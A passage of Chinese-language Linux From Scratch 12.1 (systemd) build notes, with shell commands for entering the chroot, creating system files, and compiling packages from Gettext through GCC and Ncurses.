并构建其他临时工具\r\n\r\n#### 改变所有者\r\n\r\n```sh\r\nsu root\r\nchown -R root:root $LFS/{usr,lib,var,etc,bin,sbin,tools}\r\ncase $(uname -m) in\r\n  x86_64) chown -R root:root $LFS/lib64 ;;\r\nesac\r\n```\r\n\r\n#### 准备虚拟内核文件系统\r\n\r\n```sh\r\nmkdir -pv $LFS/{dev,proc,sys,run}\r\n\r\nmount -v --bind /dev $LFS/dev\r\n\r\nmount -vt devpts devpts -o gid=5,mode=0620 $LFS/dev/pts\r\nmount -vt proc proc $LFS/proc\r\nmount -vt sysfs sysfs $LFS/sys\r\nmount -vt tmpfs tmpfs $LFS/run\r\n\r\nif [ -h $LFS/dev/shm ]; then\r\n  install -v -d -m 1777 $LFS$(realpath /dev/shm)\r\nelse\r\n  mount -vt tmpfs -o nosuid,nodev tmpfs $LFS/dev/shm\r\nfi\r\n```\r\n\r\n#### 进入 Chroot 环境\r\n\r\n```sh\r\nchroot \"$LFS\" /usr/bin/env -i   \\\r\n    HOME=/root                  \\\r\n    TERM=\"$TERM\"                \\\r\n    PS1=\'(lfs chroot) \\u:\\w\\$ \' \\\r\n    PATH=/usr/bin:/usr/sbin     \\\r\n    MAKEFLAGS=\"-j$(nproc)\"      \\\r\n    TESTSUITEFLAGS=\"-j$(nproc)\" \\\r\n    /bin/bash --login\r\n```\r\n\r\n#### 创建目录\r\n\r\n```sh\r\nmkdir -pv /{boot,home,mnt,opt,srv}\r\n\r\nmkdir -pv /etc/{opt,sysconfig}\r\nmkdir -pv /lib/firmware\r\nmkdir -pv /media/{floppy,cdrom}\r\nmkdir -pv /usr/{,local/}{include,src}\r\nmkdir -pv /usr/local/{bin,lib,sbin}\r\nmkdir -pv /usr/{,local/}share/{color,dict,doc,info,locale,man}\r\nmkdir -pv /usr/{,local/}share/{misc,terminfo,zoneinfo}\r\nmkdir -pv /usr/{,local/}share/man/man{1..8}\r\nmkdir -pv /var/{cache,local,log,mail,opt,spool}\r\nmkdir -pv /var/lib/{color,misc,locate}\r\n\r\nln -sfv /run /var/run\r\nln -sfv /run/lock /var/lock\r\n\r\ninstall -dv -m 0750 /root\r\ninstall -dv -m 1777 /tmp /var/tmp\r\n```\r\n\r\n#### 创建必要的文件和符号链接\r\n\r\n```sh\r\nln -sv /proc/self/mounts /etc/mtab\r\n\r\ncat > /etc/hosts << EOF\r\n127.0.0.1  localhost LAPTOP\r\n::1        localhost\r\nEOF\r\n\r\ncat > /etc/passwd << \"EOF\"\r\nroot:x:0:0:root:/root:/bin/bash\r\nbin:x:1:1:bin:/dev/null:/usr/bin/false\r\ndaemon:x:6:6:Daemon User:/dev/null:/usr/bin/false\r\nmessagebus:x:18:18:D-Bus Message Daemon User:/run/dbus:/usr/bin/false\r\nsystemd-journal-gateway:x:73:73:systemd Journal Gateway:/:/usr/bin/false\r\nsystemd-journal-remote:x:74:74:systemd Journal Remote:/:/usr/bin/false\r\nsystemd-journal-upload:x:75:75:systemd Journal Upload:/:/usr/bin/false\r\nsystemd-network:x:76:76:systemd Network Management:/:/usr/bin/false\r\nsystemd-resolve:x:77:77:systemd Resolver:/:/usr/bin/false\r\nsystemd-timesync:x:78:78:systemd Time Synchronization:/:/usr/bin/false\r\nsystemd-coredump:x:79:79:systemd Core Dumper:/:/usr/bin/false\r\nuuidd:x:80:80:UUID Generation Daemon User:/dev/null:/usr/bin/false\r\nsystemd-oom:x:81:81:systemd Out Of Memory Daemon:/:/usr/bin/false\r\nnobody:x:65534:65534:Unprivileged User:/dev/null:/usr/bin/false\r\nEOF\r\n\r\ncat > /etc/group << \"EOF\"\r\nroot:x:0:\r\nbin:x:1:daemon\r\nsys:x:2:\r\nkmem:x:3:\r\ntape:x:4:\r\ntty:x:5:\r\ndaemon:x:6:\r\nfloppy:x:7:\r\ndisk:x:8:\r\nlp:x:9:\r\ndialout:x:10:\r\naudio:x:11:\r\nvideo:x:12:\r\nutmp:x:13:\r\ncdrom:x:15:\r\nadm:x:16:\r\nmessagebus:x:18:\r\nsystemd-journal:x:23:\r\ninput:x:24:\r\nmail:x:34:\r\nkvm:x:61:\r\nsystemd-journal-gateway:x:73:\r\nsystemd-journal-remote:x:74:\r\nsystemd-journal-upload:x:75:\r\nsystemd-network:x:76:\r\nsystemd-resolve:x:77:\r\nsystemd-timesync:x:78:\r\nsystemd-coredump:x:79:\r\nuuidd:x:80:\r\nsystemd-oom:x:81:\r\nwheel:x:97:\r\nusers:x:999:\r\nnogroup:x:65534:\r\nEOF\r\n\r\necho \"tester:x:101:101::/home/tester:/bin/bash\" >> /etc/passwd\r\necho \"tester:x:101:\" >> /etc/group\r\ninstall -o tester -d /home/tester\r\n\r\nexec /usr/bin/bash --login\r\n\r\ntouch /var/log/{btmp,lastlog,faillog,wtmp}\r\nchgrp -v utmp /var/log/lastlog\r\nchmod -v 664  /var/log/lastlog\r\nchmod -v 600  /var/log/btmp\r\n```\r\n\r\n#### Gettext-0.22.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gettext-0.22.4.tar.xz\r\ncd gettext-0.22.4\r\n\r\n./configure --disable-shared\r\n\r\nmake\r\ncp -v gettext-tools/src/{msgfmt,msgmerge,xgettext} /usr/bin\r\n\r\ncd /sources\r\nrm -rf gettext-0.22.4\r\n```\r\n\r\n#### Bison-3.8.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf bison-3.8.2.tar.xz \r\ncd bison-3.8.2\r\n\r\n./configure --prefix=/usr \\\r\n            --docdir=/usr/share/doc/bison-3.8.2\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf bison-3.8.2\r\n```\r\n\r\n#### Perl-5.38.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf perl-5.38.2.tar.xz\r\ncd perl-5.38.2\r\n\r\nsh Configure -des                                        \\\r\n             -Dprefix=/usr                               \\\r\n             -Dvendorprefix=/usr                         \\\r\n             -Duseshrplib                                \\\r\n             -Dprivlib=/usr/lib/perl5/5.38/core_perl     \\\r\n             -Darchlib=/usr/lib/perl5/5.38/core_perl     \\\r\n             -Dsitelib=/usr/lib/perl5/5.38/site_perl     \\\r\n             -Dsitearch=/usr/lib/perl5/5.38/site_perl    \\\r\n             -Dvendorlib=/usr/lib/perl5/5.38/vendor_perl \\\r\n             -Dvendorarch=/usr/lib/perl5/5.38/vendor_perl\r\n             \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf perl-5.38.2\r\n```\r\n\r\n#### Python-3.12.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf Python-3.12.2.tar.xz\r\ncd Python-3.12.2\r\n\r\n./configure --prefix=/usr   \\\r\n            --enable-shared \\\r\n            --without-ensurepip\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf Python-3.12.2\r\n```\r\n\r\n#### Texinfo-7.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf texinfo-7.1.tar.xz\r\ncd texinfo-7.1\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf texinfo-7.1\r\n```\r\n\r\n#### Util-linux-2.39.3\r\n\r\n```sh\r\ncd /sources\r\ntar -xf util-linux-2.39.3.tar.xz\r\ncd util-linux-2.39.3\r\n\r\nmkdir -pv /var/lib/hwclock\r\n\r\n./configure --libdir=/usr/lib    \\\r\n            --runstatedir=/run   \\\r\n            --disable-chfn-chsh  \\\r\n            --disable-login      \\\r\n            --disable-nologin    \\\r\n            --disable-su         \\\r\n            --disable-setpriv    \\\r\n            --disable-runuser    \\\r\n            --disable-pylibmount \\\r\n            --disable-static     \\\r\n            --without-python     \\\r\n            ADJTIME_PATH=/var/lib/hwclock/adjtime \\\r\n            --docdir=/usr/share/doc/util-linux-2.39.3\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf util-linux-2.39.3\r\n```\r\n\r\n#### 清理和备份临时系统\r\n\r\n```sh\r\nrm -rf /usr/share/{info,man,doc}/*\r\n\r\nfind /usr/{lib,libexec} -name \\*.la -delete\r\n\r\nrm -rf /tools\r\n\r\nexit\r\n\r\nmountpoint -q $LFS/dev/shm && umount $LFS/dev/shm\r\numount $LFS/dev/pts\r\numount $LFS/{sys,proc,run,dev}\r\n\r\ncd $LFS\r\ntar -cJpf $HOME/lfs-temp-tools-12.1-systemd.tar.xz .\r\n```\r\n\r\n> 还原\r\n>\r\n> ```sh\r\n> cd $LFS\r\n> rm -rf ./*\r\n> tar -xpf $HOME/lfs-temp-tools-12.1-systemd.tar.xz\r\n> ```\r\n\r\n### 安装基本系统软件\r\n\r\n#### Man-pages-6.06\r\n\r\n```sh\r\ncd /sources\r\ntar -xf man-pages-6.06.tar.xz\r\ncd man-pages-6.06\r\n\r\nrm -v man3/crypt*\r\n\r\nmake prefix=/usr install\r\n\r\ncd /sources\r\nrm -rf man-pages-6.06\r\n```\r\n\r\n#### Iana-Etc-20240125\r\n\r\n```sh\r\ncd /sources\r\ntar -xf iana-etc-20240125.tar.gz \r\ncd iana-etc-20240125\r\n\r\ncp services protocols /etc\r\n\r\ncd /sources\r\nrm -rf iana-etc-20240125\r\n```\r\n\r\n#### Glibc-2.39\r\n\r\n```sh\r\ncd /sources\r\ntar -xf glibc-2.39.tar.xz\r\ncd glibc-2.39\r\n\r\npatch -Np1 -i ../glibc-2.39-fhs-1.patch\r\n\r\nmkdir -v build\r\ncd build\r\n\r\necho \"rootsbindir=/usr/sbin\" > configparms\r\n\r\n../configure --prefix=/usr                            \\\r\n             --disable-werror                         \\\r\n             --enable-kernel=4.19                     \\\r\n             --enable-stack-protector=strong          \\\r\n             --disable-nscd                           \\\r\n             libc_cv_slibdir=/usr/lib\r\n             \r\nmake\r\n\r\ntouch /etc/ld.so.conf\r\n\r\nsed \'/test-installation/s@$(PERL)@echo not running@\' -i ../Makefile\r\n\r\nmake install\r\n\r\nsed \'/RTLDLIST=/s@/usr@@g\' -i /usr/bin/ldd\r\n\r\nmkdir -pv /usr/lib/locale\r\nlocaledef -i C -f UTF-8 C.UTF-8\r\nlocaledef -i cs_CZ -f UTF-8 cs_CZ.UTF-8\r\nlocaledef -i de_DE -f ISO-8859-1 de_DE\r\nlocaledef -i de_DE@euro -f ISO-8859-15 de_DE@euro\r\nlocaledef -i de_DE -f UTF-8 de_DE.UTF-8\r\nlocaledef -i el_GR -f ISO-8859-7 el_GR\r\nlocaledef -i en_GB -f ISO-8859-1 en_GB\r\nlocaledef -i en_GB -f UTF-8 en_GB.UTF-8\r\nlocaledef -i en_HK -f ISO-8859-1 en_HK\r\nlocaledef -i en_PH -f ISO-8859-1 en_PH\r\nlocaledef -i en_US -f ISO-8859-1 en_US\r\nlocaledef -i en_US -f UTF-8 en_US.UTF-8\r\nlocaledef -i es_ES -f ISO-8859-15 es_ES@euro\r\nlocaledef -i es_MX -f ISO-8859-1 es_MX\r\nlocaledef -i fa_IR -f UTF-8 fa_IR\r\nlocaledef -i fr_FR -f ISO-8859-1 fr_FR\r\nlocaledef -i fr_FR@euro -f ISO-8859-15 fr_FR@euro\r\nlocaledef -i fr_FR -f UTF-8 fr_FR.UTF-8\r\nlocaledef -i is_IS -f ISO-8859-1 is_IS\r\nlocaledef -i is_IS -f UTF-8 is_IS.UTF-8\r\nlocaledef -i it_IT -f ISO-8859-1 it_IT\r\nlocaledef -i it_IT -f ISO-8859-15 it_IT@euro\r\nlocaledef -i it_IT -f UTF-8 it_IT.UTF-8\r\nlocaledef -i ja_JP -f EUC-JP ja_JP\r\nlocaledef -i ja_JP -f SHIFT_JIS ja_JP.SJIS 2> /dev/null || true\r\nlocaledef -i ja_JP -f UTF-8 ja_JP.UTF-8\r\nlocaledef -i nl_NL@euro -f ISO-8859-15 nl_NL@euro\r\nlocaledef -i ru_RU -f KOI8-R ru_RU.KOI8-R\r\nlocaledef -i ru_RU -f UTF-8 ru_RU.UTF-8\r\nlocaledef -i se_NO -f UTF-8 se_NO.UTF-8\r\nlocaledef -i ta_IN -f UTF-8 ta_IN.UTF-8\r\nlocaledef -i tr_TR -f UTF-8 tr_TR.UTF-8\r\nlocaledef -i zh_CN -f GB18030 zh_CN.GB18030\r\nlocaledef -i zh_HK -f BIG5-HKSCS zh_HK.BIG5-HKSCS\r\nlocaledef -i zh_TW -f UTF-8 zh_TW.UTF-8\r\n\r\ncat > /etc/nsswitch.conf << \"EOF\"\r\n# Begin /etc/nsswitch.conf\r\n\r\npasswd: files systemd\r\ngroup: files systemd\r\nshadow: files systemd\r\n\r\nhosts: mymachines resolve [!UNAVAIL=return] files myhostname dns\r\nnetworks: files\r\n\r\nprotocols: files\r\nservices: files\r\nethers: files\r\nrpc: files\r\n\r\n# End /etc/nsswitch.conf\r\nEOF\r\n\r\ntar -xf ../../tzdata2024a.tar.gz\r\n\r\nZONEINFO=/usr/share/zoneinfo\r\nmkdir -pv $ZONEINFO/{posix,right}\r\n\r\nfor tz in etcetera southamerica northamerica europe africa antarctica  \\\r\n          asia australasia backward; do\r\n    zic -L /dev/null   -d $ZONEINFO       ${tz}\r\n    zic -L /dev/null   -d $ZONEINFO/posix ${tz}\r\n    zic -L leapseconds -d $ZONEINFO/right ${tz}\r\ndone\r\n\r\ncp -v zone.tab zone1970.tab iso3166.tab $ZONEINFO\r\nzic -d $ZONEINFO -p America/New_York\r\nunset ZONEINFO\r\n\r\ntzselect\r\n\r\n# ln -sfv /usr/share/zoneinfo/<xxx> /etc/localtime\r\nln -sfv /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\r\n\r\ncat > /etc/ld.so.conf << \"EOF\"\r\n# Begin /etc/ld.so.conf\r\n/usr/local/lib\r\n/opt/lib\r\nEOF\r\n\r\ncat >> /etc/ld.so.conf << \"EOF\"\r\n# Add an include directory\r\ninclude /etc/ld.so.conf.d/*.conf\r\n\r\nEOF\r\nmkdir -pv /etc/ld.so.conf.d\r\n\r\ncd /sources\r\nrm -rf glibc-2.39\r\n```\r\n\r\n#### Zlib-1.3.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf zlib-1.3.1.tar.gz\r\ncd zlib-1.3.1\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\nrm -fv /usr/lib/libz.a\r\n\r\ncd /sources\r\nrm -rf zlib-1.3.1\r\n```\r\n\r\n#### Bzip2-1.0.8\r\n\r\n```sh\r\ncd /sources\r\ntar -xf bzip2-1.0.8.tar.gz\r\ncd bzip2-1.0.8\r\n\r\npatch -Np1 -i ../bzip2-1.0.8-install_docs-1.patch\r\n\r\nsed -i \'s@\\(ln -s -f \\)$(PREFIX)/bin/@\\1@\' Makefile\r\n\r\nsed -i \"s@(PREFIX)/man@(PREFIX)/share/man@g\" Makefile\r\n\r\nmake -f Makefile-libbz2_so\r\nmake clean\r\n\r\nmake\r\nmake PREFIX=/usr install\r\n\r\ncp -av libbz2.so.* /usr/lib\r\nln -sv libbz2.so.1.0.8 /usr/lib/libbz2.so\r\n\r\ncp -v bzip2-shared /usr/bin/bzip2\r\nfor i in /usr/bin/{bzcat,bunzip2}; do\r\n  ln -sfv bzip2 $i\r\ndone\r\n\r\nrm -fv /usr/lib/libbz2.a\r\n\r\ncd /sources\r\nrm -rf bzip2-1.0.8\r\n```\r\n\r\n#### Xz-5.4.6\r\n\r\n```sh \r\ncd /sources\r\ntar -xf xz-5.4.6.tar.xz\r\ncd xz-5.4.6\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --docdir=/usr/share/doc/xz-5.4.6\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf xz-5.4.6\r\n```\r\n\r\n#### Zstd-1.5.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf zstd-1.5.5.tar.gz \r\ncd zstd-1.5.5\r\n\r\nmake prefix=/usr\r\nmake prefix=/usr install\r\nrm -v /usr/lib/libzstd.a\r\n\r\ncd /sources\r\nrm -rf zstd-1.5.5\r\n```\r\n\r\n#### File-5.45\r\n\r\n```sh\r\ncd /sources\r\ntar -xf file-5.45.tar.gz\r\ncd file-5.45\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf file-5.45\r\n```\r\n\r\n#### Readline-8.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf readline-8.2.tar.gz\r\ncd readline-8.2\r\n\r\nsed -i \'/MV.*old/d\' Makefile.in\r\nsed -i \'/{OLDSUFF}/c:\' support/shlib-install\r\n\r\npatch -Np1 -i ../readline-8.2-upstream_fixes-3.patch\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --with-curses    \\\r\n            --docdir=/usr/share/doc/readline-8.2\r\n            \r\nmake SHLIB_LIBS=\"-lncursesw\"\r\nmake SHLIB_LIBS=\"-lncursesw\" install\r\ninstall -v -m644 doc/*.{ps,pdf,html,dvi} /usr/share/doc/readline-8.2\r\n\r\ncd /sources\r\nrm -rf readline-8.2\r\n```\r\n\r\n#### M4-1.4.19\r\n\r\n```sh\r\ncd /sources\r\ntar -xf m4-1.4.19.tar.xz\r\ncd m4-1.4.19\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf m4-1.4.19\r\n```\r\n\r\n#### Bc-6.7.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf bc-6.7.5.tar.xz\r\ncd bc-6.7.5\r\n\r\nCC=gcc ./configure --prefix=/usr -G -O3 -r\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf bc-6.7.5\r\n```\r\n\r\n#### Flex-2.6.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf flex-2.6.4.tar.gz \r\ncd flex-2.6.4\r\n\r\n./configure --prefix=/usr \\\r\n            --docdir=/usr/share/doc/flex-2.6.4 \\\r\n            --disable-static\r\n            \r\nmake\r\nmake install\r\n\r\nln -sv flex   /usr/bin/lex\r\nln -sv flex.1 /usr/share/man/man1/lex.1\r\n\r\ncd /sources\r\nrm -rf flex-2.6.4\r\n```\r\n\r\n#### Tcl-8.6.13\r\n\r\n```sh\r\ncd /sources\r\ntar -xf tcl8.6.13-src.tar.gz\r\ncd tcl8.6.13\r\n\r\nSRCDIR=$(pwd)\r\ncd unix\r\n./configure --prefix=/usr           \\\r\n            --mandir=/usr/share/man\r\n            \r\nmake\r\n\r\nsed -e \"s|$SRCDIR/unix|/usr/lib|\" \\\r\n    -e \"s|$SRCDIR|/usr/include|\"  \\\r\n    -i tclConfig.sh\r\n\r\nsed -e \"s|$SRCDIR/unix/pkgs/tdbc1.1.5|/usr/lib/tdbc1.1.5|\" \\\r\n    -e \"s|$SRCDIR/pkgs/tdbc1.1.5/generic|/usr/include|\"    \\\r\n    -e \"s|$SRCDIR/pkgs/tdbc1.1.5/library|/usr/lib/tcl8.6|\" \\\r\n    -e \"s|$SRCDIR/pkgs/tdbc1.1.5|/usr/include|\"            \\\r\n    -i pkgs/tdbc1.1.5/tdbcConfig.sh\r\n\r\nsed -e \"s|$SRCDIR/unix/pkgs/itcl4.2.3|/usr/lib/itcl4.2.3|\" \\\r\n    -e \"s|$SRCDIR/pkgs/itcl4.2.3/generic|/usr/include|\"    \\\r\n    -e \"s|$SRCDIR/pkgs/itcl4.2.3|/usr/include|\"            \\\r\n    -i pkgs/itcl4.2.3/itclConfig.sh\r\n\r\nunset SRCDIR\r\n\r\nmake install\r\n\r\nchmod -v u+w /usr/lib/libtcl8.6.so\r\n\r\nmake install-private-headers\r\n\r\nln -sfv tclsh8.6 /usr/bin/tclsh\r\n\r\nmv /usr/share/man/man3/{Thread,Tcl_Thread}.3\r\n\r\ncd ..\r\ntar -xf ../tcl8.6.13-html.tar.gz --strip-components=1\r\nmkdir -v -p /usr/share/doc/tcl-8.6.13\r\ncp -v -r  ./html/* /usr/share/doc/tcl-8.6.13\r\n\r\ncd /sources\r\nrm -rf tcl8.6.13\r\n```\r\n\r\n#### Expect-5.45.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf expect5.45.4.tar.gz\r\ncd expect5.45.4\r\n\r\npython3 -c \'from pty import spawn; spawn([\"echo\", \"ok\"])\'\r\n\r\n./configure --prefix=/usr           \\\r\n            --with-tcl=/usr/lib     \\\r\n            --enable-shared         \\\r\n            --mandir=/usr/share/man \\\r\n            --with-tclinclude=/usr/include\r\n       \r\nmake\r\nmake install\r\nln -svf expect5.45.4/libexpect5.45.4.so /usr/lib\r\n\r\ncd /sources\r\nrm -rf expect5.45.4\r\n```\r\n\r\n#### DejaGNU-1.6.3\r\n\r\n```sh\r\ncd /sources\r\ntar -xf dejagnu-1.6.3.tar.gz\r\ncd dejagnu-1.6.3\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure --prefix=/usr\r\nmakeinfo --html --no-split -o doc/dejagnu.html ../doc/dejagnu.texi\r\nmakeinfo --plaintext       -o doc/dejagnu.txt  ../doc/dejagnu.texi\r\n\r\nmake install\r\ninstall -v -dm755  /usr/share/doc/dejagnu-1.6.3\r\ninstall -v -m644   doc/dejagnu.{html,txt} /usr/share/doc/dejagnu-1.6.3\r\n\r\ncd /sources\r\nrm -rf dejagnu-1.6.3\r\n```\r\n\r\n#### Pkgconf-2.1.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf pkgconf-2.1.1.tar.xz\r\ncd pkgconf-2.1.1\r\n\r\n./configure --prefix=/usr              \\\r\n            --disable-static           \\\r\n            --docdir=/usr/share/doc/pkgconf-2.1.1\r\n                     \r\nmake\r\nmake install\r\nln -sv pkgconf   /usr/bin/pkg-config\r\nln -sv pkgconf.1 /usr/share/man/man1/pkg-config.1\r\n\r\ncd /sources\r\nrm -rf pkgconf-2.1.1\r\n```\r\n\r\n#### Binutils-2.42\r\n\r\n```sh\r\ncd /sources\r\ntar -xf binutils-2.42.tar.xz\r\ncd binutils-2.42\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure --prefix=/usr       \\\r\n             --sysconfdir=/etc   \\\r\n             --enable-gold       \\\r\n             --enable-ld=default \\\r\n             --enable-plugins    \\\r\n             --enable-shared     \\\r\n             --disable-werror    \\\r\n             --enable-64-bit-bfd \\\r\n             --with-system-zlib  \\\r\n             --enable-default-hash-style=gnu\r\n             \r\nmake tooldir=/usr\r\n\r\ngrep \'^FAIL:\' $(find -name \'*.log\')\r\nmake tooldir=/usr install\r\nrm -fv /usr/lib/lib{bfd,ctf,ctf-nobfd,gprofng,opcodes,sframe}.a\r\n\r\ncd /sources\r\nrm -rf binutils-2.42\r\n```\r\n\r\n#### GMP-6.3.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gmp-6.3.0.tar.xz\r\ncd gmp-6.3.0\r\n\r\n./configure --prefix=/usr    \\\r\n            --enable-cxx     \\\r\n            --disable-static \\\r\n            --docdir=/usr/share/doc/gmp-6.3.0\r\n            \r\nmake\r\nmake html\r\nmake check 2>&1 | tee gmp-check-log\r\nawk \'/# PASS:/{total+=$3} ; END{print total}\' gmp-check-log\r\nmake install\r\nmake install-html\r\n\r\ncd /sources\r\nrm -rf gmp-6.3.0\r\n```\r\n\r\n#### MPFR-4.2.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf mpfr-4.2.1.tar.xz\r\ncd mpfr-4.2.1\r\n\r\n./configure --prefix=/usr        \\\r\n            --disable-static     \\\r\n            --enable-thread-safe \\\r\n            --docdir=/usr/share/doc/mpfr-4.2.1\r\n            \r\nmake\r\nmake html\r\n\r\nmake install\r\nmake install-html\r\n\r\ncd /sources\r\nrm -rf mpfr-4.2.1\r\n```\r\n\r\n#### MPC-1.3.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf mpc-1.3.1.tar.gz \r\ncd mpc-1.3.1\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --docdir=/usr/share/doc/mpc-1.3.1\r\n            \r\nmake\r\nmake html\r\n\r\nmake install\r\nmake install-html\r\n\r\ncd /sources\r\nrm -rf mpc-1.3.1\r\n```\r\n\r\n#### Attr-2.5.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf attr-2.5.2.tar.gz\r\ncd attr-2.5.2\r\n\r\n./configure --prefix=/usr     \\\r\n            --disable-static  \\\r\n            --sysconfdir=/etc \\\r\n            --docdir=/usr/share/doc/attr-2.5.2\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf attr-2.5.2\r\n```\r\n\r\n#### Acl-2.3.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf acl-2.3.2.tar.xz\r\ncd acl-2.3.2\r\n\r\n./configure --prefix=/usr         \\\r\n            --disable-static      \\\r\n            --docdir=/usr/share/doc/acl-2.3.2\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf acl-2.3.2\r\n```\r\n\r\n#### Libcap-2.69\r\n\r\n```sh\r\ncd /sources\r\ntar -xf libcap-2.69.tar.xz\r\ncd libcap-2.69\r\n\r\nsed -i \'/install -m.*STA/d\' libcap/Makefile\r\n\r\nmake prefix=/usr lib=lib\r\n\r\nmake prefix=/usr lib=lib install\r\n\r\ncd /sources\r\nrm -rf libcap-2.69\r\n```\r\n\r\n#### Libxcrypt-4.4.36\r\n\r\n```sh\r\ncd /sources\r\ntar -xf libxcrypt-4.4.36.tar.xz\r\ncd libxcrypt-4.4.36\r\n\r\n./configure --prefix=/usr                \\\r\n            --enable-hashes=strong,glibc \\\r\n            --enable-obsolete-api=no     \\\r\n            --disable-static             \\\r\n            --disable-failure-tokens\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf libxcrypt-4.4.36\r\n```\r\n\r\n> 为了满足一些仅有二进制版本的程序，或者满足 LSB 兼容性，必须使用这些函数，执行以下命令再次构建该软件包\r\n>\r\n> ```\r\n> make distclean\r\n> ./configure --prefix=/usr                \\\r\n>          --enable-hashes=strong,glibc \\\r\n>          --enable-obsolete-api=glibc  \\\r\n>          --disable-static             \\\r\n>          --disable-failure-tokens\r\n> make\r\n> cp -av --remove-destination .libs/libcrypt.so.1* /usr/lib\r\n> ```\r\n\r\n#### Shadow-4.14.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf shadow-4.14.5.tar.xz\r\ncd shadow-4.14.5\r\n\r\nsed -i \'s/groups$(EXEEXT) //\' src/Makefile.in\r\nfind man -name Makefile.in -exec sed -i \'s/groups\\.1 / /\'   {} \\;\r\nfind man -name Makefile.in -exec sed -i \'s/getspnam\\.3 / /\' {} \\;\r\nfind man -name Makefile.in -exec sed -i \'s/passwd\\.5 / /\'   {} \\;\r\n\r\nsed -e \'s:#ENCRYPT_METHOD DES:ENCRYPT_METHOD YESCRYPT:\' \\\r\n    -e \'s:/var/spool/mail:/var/mail:\'                   \\\r\n    -e \'/PATH=/{s@/sbin:@@;s@/bin:@@}\'                  \\\r\n    -i etc/login.defs\r\n    \r\ntouch /usr/bin/passwd\r\n./configure --sysconfdir=/etc   \\\r\n            --disable-static    \\\r\n            --with-{b,yes}crypt \\\r\n            --without-libbsd    \\\r\n            --with-group-name-max-length=32\r\n            \r\nmake\r\nmake exec_prefix=/usr install\r\nmake -C man install-man\r\n\r\npwconv\r\ngrpconv\r\n\r\nmkdir -p /etc/default\r\nuseradd -D --gid 999\r\n\r\nsed -i \'/MAIL/s/yes/no/\' /etc/default/useradd\r\n\r\npasswd root\r\n\r\ncd /sources\r\nrm -rf shadow-4.14.5\r\n```\r\n\r\n#### GCC-13.2.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gcc-13.2.0.tar.xz\r\ncd gcc-13.2.0\r\n\r\ncase $(uname -m) in\r\n  x86_64)\r\n    sed -e \'/m64=/s/lib64/lib/\' \\\r\n        -i.orig gcc/config/i386/t-linux64\r\n  ;;\r\nesac\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure --prefix=/usr            \\\r\n             LD=ld                    \\\r\n             --enable-languages=c,c++ \\\r\n             --enable-default-pie     \\\r\n             --enable-default-ssp     \\\r\n             --disable-multilib       \\\r\n             --disable-bootstrap      \\\r\n             --disable-fixincludes    \\\r\n             --with-system-zlib\r\n             \r\nmake\r\n\r\nulimit -s 32768\r\n\r\nmake install\r\n\r\nchown -v -R root:root \\\r\n    /usr/lib/gcc/$(gcc -dumpmachine)/13.2.0/include{,-fixed}\r\n    \r\nln -svr /usr/bin/cpp /usr/lib\r\n\r\nln -sv gcc.1 /usr/share/man/man1/cc.1\r\n\r\nln -sfv ../../libexec/gcc/$(gcc -dumpmachine)/13.2.0/liblto_plugin.so \\\r\n        /usr/lib/bfd-plugins/\r\n        \r\necho \'int main(){}\' > dummy.c\r\ncc dummy.c -v -Wl,--verbose &> dummy.log\r\nreadelf -l a.out | grep \': /lib\'\r\n\r\ngrep -E -o \'/usr/lib.*/S?crt[1in].*succeeded\' dummy.log\r\n\r\ngrep -B4 \'^ /usr/include\' dummy.log\r\n\r\ngrep \'SEARCH.*/usr/lib\' dummy.log |sed \'s|; |\\n|g\'\r\n\r\ngrep \"/lib.*/libc.so.6 \" dummy.log\r\n\r\ngrep found dummy.log\r\n\r\nrm -v dummy.c a.out dummy.log\r\n\r\nmkdir -pv /usr/share/gdb/auto-load/usr/lib\r\nmv -v /usr/lib/*gdb.py /usr/share/gdb/auto-load/usr/lib\r\n\r\ncd /sources\r\nrm -rf gcc-13.2.0\r\n```\r\n\r\n#### Ncurses-6.4-20230520\r\n\r\n```sh\r\ncd /sources\r\ntar -xf ncurses-6.4-20230520.tar.xz\r\ncd ncurses-6.4-20230520\r\n\r\n./configure --prefix=/usr           \\\r\n            --mandir=/usr/share/man \\\r\n            --with-shared           \\\r\n            --without-debug         \\\r\n            --without-normal        \\\r\n            